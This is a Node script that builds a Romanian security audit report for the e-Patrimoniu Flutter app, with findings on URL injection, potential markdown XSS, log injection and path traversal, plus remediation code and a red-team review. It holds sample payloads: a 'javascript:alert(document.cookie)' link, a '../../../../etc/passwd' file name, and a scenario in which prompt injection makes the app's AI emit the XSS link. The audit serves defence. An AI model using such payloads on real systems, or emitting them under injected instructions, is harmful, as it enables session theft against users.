children.push(code('// Exemplu de utilizare VIITOARE vulnerabilă (pattern comun):'));
children.push(code('// launchUrl(Uri.parse(doc.fileUrl));  // PERICULOS dacă fileUrl = "javascript:..."'));
children.push(h3('Cod Remediat'));
children.push(code('// lib/core/utils/url_validator.dart (fișier nou)'));
children.push(code('class UrlValidator {'));
children.push(code('  static const _allowedSchemes = {\'https\', \'http\'};'));
children.push(code('  static const _allowedHosts   = {'));
children.push(code('    \'firebasestorage.googleapis.com\','));
children.push(code('    \'storage.googleapis.com\','));
children.push(code('  };'));
children.push(code(''));
children.push(code('  /// Returnează true dacă URL-ul este sigur pentru a fi deschis'));
children.push(code('  static bool isSafeUrl(String? url) {'));
children.push(code('    if (url == null || url.isEmpty) return false;'));
children.push(code('    final uri = Uri.tryParse(url);'));
children.push(code('    if (uri == null) return false;'));
children.push(code('    if (!_allowedSchemes.contains(uri.scheme.toLowerCase())) return false;'));
children.push(code('    return _allowedHosts.any((h) => uri.host.endsWith(h));'));
children.push(code('  }'));
children.push(code(''));
children.push(code('  /// Aruncă ArgumentError dacă URL-ul nu e sigur'));
children.push(code('  static void assertSafe(String? url, String fieldName) {'));
children.push(code('    if (!isSafeUrl(url)) throw ArgumentError(\'URL nesigur în $fieldName: $url\');'));
children.push(code('  }'));
children.push(code('}'));
children.push(code(''));
children.push(code('// În orice ecran care deschide un URL:'));
children.push(code('if (action == \'view\') {'));
children.push(code('  final url = doc.fileUrl;'));
children.push(code('  if (!UrlValidator.isSafeUrl(url)) {'));
children.push(code('    ScaffoldMessenger.of(context).showSnackBar('));
children.push(code('      const SnackBar(content: Text(\'URL invalid sau nesigur.\'),'));
children.push(code('                    backgroundColor: AppTheme.errorRed));'));
children.push(code('    return;'));
children.push(code('  }'));
children.push(code('  await launchUrl(Uri.parse(url), mode: LaunchMode.externalApplication);'));
children.push(code('}'));
children.push(new Paragraph({ spacing: { before: 20, after: 20 }, children: [] }));

// ── S-XSS-02 ─────────────────────────────────────────────────────────────
children.push(sep());
children.push(findingHeader('S-XSS-02', 'Stored XSS via flutter_markdown_plus cu conținut AI nevalidat', '6.8', 'MEDIUM'));
children.push(new Paragraph({ spacing: { before: 80, after: 0 }, children: [] }));
children.push(metaTable([
  ['CWE',       'CWE-79: Cross-site Scripting (Stored); CWE-116: Improper Encoding/Escaping of Output'],
  ['OWASP ASVS','V5.3.6 – Encoding HTML contextual la output; V5.3.3 – Encoding output pentru Markdown'],
  ['OWASP Top10','A03:2021 – Injection (XSS)'],
  ['NIS2',      'Art. 21(2)(d) – Securitatea datelor procesate'],
  ['GDPR',      'Art. 25 – Data protection by design and by default'],
  ['CVSS v3.1', 'AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:L/A:N = 6.8 (MEDIUM)'],
]));
children.push(new Paragraph({ spacing: { before: 80, after: 20 }, children: [] }));
children.push(h3('Descriere'));
children.push(para('Pachetul flutter_markdown_plus ^1.0.7 este declarat în pubspec.yaml. AiAssistantScreen afișează răspunsurile AI cu un widget Text() simplu (linia 328 din ai_assistant_screen.dart), deci NU este vulnerabil în implementarea curentă. Totuși, există un risc arhitectural semnificativ: dacă desarrollatorul înlocuiește Text() cu MarkdownBody() pentru a suporta formatare bogată în răspunsurile AI, și MarkdownBody este configurat cu enableHtml: true (implicit în unele versiuni), răspunsurile AI care conțin HTML brut pot executa JavaScript via window.eval() sau handlerele de clic inline.'));
children.push(para([
  { text: 'Scenarul de atac: ', bold: true },
  'Atacatorul manipulează modelul AI (prompt injection) pentru a genera un răspuns conținând <a href="javascript:alert(document.cookie)">Click</a>. Dacă MarkdownBody redă HTML brut, utilizatorul care apasă link-ul execută JavaScript în sesiunea sa.'
]));
children.push(h3('Evidențe din cod'));
children.push(code('// pubspec.yaml – linia 23'));
children.push(code('flutter_markdown_plus: ^1.0.7  # ← DECLARAT'));
children.push(code(''));
children.push(code('// lib/ui/screens/features/ai/ai_assistant_screen.dart – linia 328'));
children.push(code('child: Text(  // ← SIGUR acum – Text() nu redă HTML'));
children.push(code('  msg.content,'));
children.push(code('  style: TextStyle(...),'));
children.push(code('),'));
children.push(code(''));
children.push(code('// RISC: schimbarea la MarkdownBody FĂRĂ configurare securizată:'));
children.push(code('// child: MarkdownBody(data: msg.content)  // PERICULOS – enableHtml poate fi true'));
children.push(h3('Cod Remediat – Configurare Securizată MarkdownBody'));
children.push(code('// Dacă se dorește Markdown în viitor, folosiți OBLIGATORIU această configurare:'));
children.push(code('import \'package:flutter_markdown_plus/flutter_markdown_plus.dart\';'));
children.push(code(''));
children.push(code('child: MarkdownBody('));
children.push(code('  data: msg.content,'));
children.push(code('  // OBLIGATORIU: dezactivați HTML brut'));
children.push(code('  // Notă: flutter_markdown_plus NU are opțiunea enableHtml=false ca parametru direct;'));
children.push(code('  // în schimb, folosiți un custom extensionSet care exclude HTML:'));
children.push(code('  extensionSet: md.ExtensionSet('));
children.push(code('    md.ExtensionSet.gitHubFlavored.blockSyntaxes,'));
children.push(code('    md.ExtensionSet.gitHubFlavored.inlineSyntaxes'));
children.push(code('      .where((s) => s is! md.InlineHtmlSyntax).toList(),'));
children.push(code('  ),'));
children.push(code('  onTapLink: (text, href, title) {'));
children.push(code('    // Validați URL înainte de a-l deschide'));
children.push(code('    if (href != null && UrlValidator.isSafeUrl(href)) {'));
children.push(code('      launchUrl(Uri.parse(href), mode: LaunchMode.externalApplication);'));
children.push(code('    }'));
children.push(code('  },'));
children.push(code('),'));
children.push(new Paragraph({ spacing: { before: 20, after: 20 }, children: [] }));

children.push(pageBreak());

// ═══════════════════════════════════════════════════════════════════════════
// SECȚIUNEA 4: RED-TEAM
// ═══════════════════════════════════════════════════════════════════════════
children.push(h1('4. Analiză Red-Team a Codului Remediat'));
children.push(para('Pentru fiecare remediere propusă, am evaluat dacă un atacator poate eluda noile controale.'));

children.push(h3('S-INJ-01 – _sanitizeFileName'));
children.push(para('Remedierea este eficientă. Limita de 50 de caractere pentru baseName previne atacurile cu nume lungi. Lista de extensii permise elimină posibilitatea de upload de fișiere .html sau .js. Un atacator cu un fileName precum "../../../../etc/passwd.pdf" va obține un baseName pur alfanumeric "___________etcpasswd" cu extensia "pdf" – inofensiv.'));
children.push(para([{ text: 'Risc rezidual: ', bold: true }, 'Un atacator poate furniza un fișier cu extensia .docx dar conținut malițios (polyglot file). Validarea extensiei NU înlocuiește validarea tip MIME la upload. Adăugați validare magic bytes pentru primii 4-8 octeți ai fișierului.']));

children.push(h3('S-INJ-02 – _sanitizeForLog'));
children.push(para('Remedierea este robustă. Eliminarea caracterelor de control (U+0000–U+001F, U+007F) previne log injection clasic. Limita de 500 de caractere previne flood-ul log-urilor. Logging-ul erorilor cu debugPrint() asigură vizibilitate când audit log-ul eșuează.'));
children.push(para([{ text: 'Risc rezidual: ', bold: true }, 'Conținut unicode valid (ex: emojis, caractere arabe cu RTL override U+202E) poate confuza anumite sisteme de vizualizare log. Considerați striparea și a caracterelor Unicode de control bidirecțional (U+200F, U+202E, U+2066–U+2069).']));

children.push(h3('S-DES-01 – getStats() Aggregation'));
children.push(para('Agregarea server-side elimină complet problema O(N). Firestore Aggregation API este GA din versiunea Flutter SDK 4.x. Countoarele denormalizate sunt mai flexibile pentru dashboard-uri complexe dar necesită logică atomică la scriere (FieldValue.increment). Ambele abordări sunt acceptabile; alegerea depinde de nevoia de date în timp real.'));

children.push(h3('S-DES-02 – Soft Delete'));
children.push(para('Soft delete-ul este o practică standard pentru sisteme cu audit trail. Atenție: adăugarea câmpului isDeleted: false ca condiție în TOATE query-urile trebuie făcută simultan (migrare atomică). Dacă uneori câmpul lipsește (documente create înainte de migrare), interogarea .where(\'isDeleted\', isEqualTo: false) va exclude documentele fără câmp. Soluție: rulați un script de migrare care adaugă isDeleted: false la toate documentele existente ÎNAINTE de deploy.'));

children.push(h3('S-XSS-01 – UrlValidator'));
children.push(para('Lista de hosturi permise (_allowedHosts) bazată pe endsWith() este corectă dar trebuie atent menținută. Un atacator nu poate registra firebasestorage.googleapis.com.evil.com și să treacă validarea deoarece endsWith verifică sufixul domeniului, nu prezența ca substring. Totuși, dacă aplicația trebuie să suporte URL-uri din alte buckets Cloud Storage (ex: un CDN custom), lista trebuie extinsă manual.'));

children.push(pageBreak());

// ═══════════════════════════════════════════════════════════════════════════
// SECȚIUNEA 5: MATRICE PRIORITIZARE
// ═══════════════════════════════════════════════════════════════════════════
children.push(h1('5. Matrice de Prioritizare Remediere'));
children.push(matrixTable([
  ['S-XSS-01',  'URL Injection via fileUrl/documentUrl',     'HIGH',   'Scăzut',  'P1 – Înainte de activarea funcției "view"'],
  ['S-DES-03',  'Absența Rate Limiting pe backend',          'MEDIUM', 'Scăzut',  'P1 – Înainte de go-live public'],
  ['S-INJ-01',  'Path Traversal via fileName nesanitizat',   'MEDIUM', 'Scăzut',  'P2 – Sprint curent'],
  ['S-INJ-02',  'Log Injection via câmpul detalii',          'MEDIUM', 'Scăzut',  'P2 – Sprint curent'],
  ['S-DES-01',  'getStats() O(N) fără limită',               'MEDIUM', 'Mediu',   'P2 – Înainte de scalare'],
  ['S-DES-02',  'Hard delete fără soft-delete',              'MEDIUM', 'Mediu',   'P2 – Necesită migrare date'],
  ['S-XSS-02',  'flutter_markdown_plus fără config. sec.',   'MEDIUM', 'Scăzut',  'P3 – Înainte de activarea Markdown'],
  ['S-INJ-03',  'Log Injection console backend',             'LOW',    'Minim',   'P3 – Mentenanță curentă'],
]));

children.push(new Paragraph({ spacing: { before: 160, after: 0 }, children: [] }));
children.push(para([
  { text: 'Notă finală: ', bold: true },
  'Vulnerabilitățile S-XSS-01 și S-DES-03 au impact imediat dacă aplicația devine publică înainte de remediere. Se recomandă tratarea lor ca P1 blocante pentru launch. Toate celelalte pot fi remediate în paralel în sprintul de consolidare securitate.'
]));

children.push(sep());
children.push(new Paragraph({ spacing: { before: 60, after: 0 }, alignment: AlignmentType.CENTER,
  children: [new TextRun({ text: 'e-Patrimoniu · Raport Securitate Vol. II · Confidențial · Iunie 2026', size: 18, font: 'Arial', color: '7F8C8D' })] }));

// ═══════════════════════════════════════════════════════════════════════════
// BUILD
// ═══════════════════════════════════════════════════════════════════════════
const doc = new Document({
  numbering: {
    config: [{
      reference: 'bullets',
      levels: [{ level: 0, format: LevelFormat.BULLET, text: '•', alignment: AlignmentType.LEFT,
        style: { paragraph: { indent: { left: 720, hanging: 360 } } } }]
    }]
  },
  styles: {
    default: { document: { run: { font: 'Arial', size: 22 } } },
    paragraphStyles: [
      { id: 'Heading1', name: 'Heading 1', basedOn: 'Normal', next: 'Normal', quickFormat: true,
        run: { size: 30, bold: true, font: 'Arial', color: C.blue },
        paragraph: { spacing: { before: 360, after: 120 }, outlineLevel: 0 } },
      { id: 'Heading2', name: 'Heading 2', basedOn: 'Normal', next: 'Normal', quickFormat: true,
        run: { size: 26, bold: true, font: 'Arial', color: C.blue },
        paragraph: { spacing: { before: 240, after: 80 }, outlineLevel: 1 } },
    ]
  },
  sections: [{
    properties: {
      page: {
        size: { width: 11906, height: 16838 },
        margin: { top: 1134, right: 1134, bottom: 1134, left: 1134 }
      }
    },
    headers: {
      default: new Header({ children: [new Paragraph({
        border: { bottom: { style: BorderStyle.SINGLE, size: 4, color: C.blue, space: 1 } },
        children: [new TextRun({ text: 'e-Patrimoniu · Raport Securitate Vol. II – Injection | Design Nesigur | XSS', size: 18, font: 'Arial', color: '7F8C8D' })]
      })] })
    },
    footers: {
      default: new Footer({ children: [new Paragraph({
        alignment: AlignmentType.RIGHT,
        children: [
          new TextRun({ text: 'Pagina ', size: 18, font: 'Arial', color: '7F8C8D' }),
          new TextRun({ children: [PageNumber.CURRENT], size: 18, font: 'Arial', color: '7F8C8D' }),
          new TextRun({ text: ' din ', size: 18, font: 'Arial', color: '7F8C8D' }),
          new TextRun({ children: [PageNumber.TOTAL_PAGES], size: 18, font: 'Arial', color: '7F8C8D' }),
        ]
      })] })
    },
    children,
  }]
});

Packer.toBuffer(doc).then(buf => {
  const out = 'security_report_vol2.docx';
  fs.writeFileSync(out, buf);
  console.log('✅ Generat: ' + out);
}).catch(e => { console.error('❌ Eroare:', e); process.exit(1); });
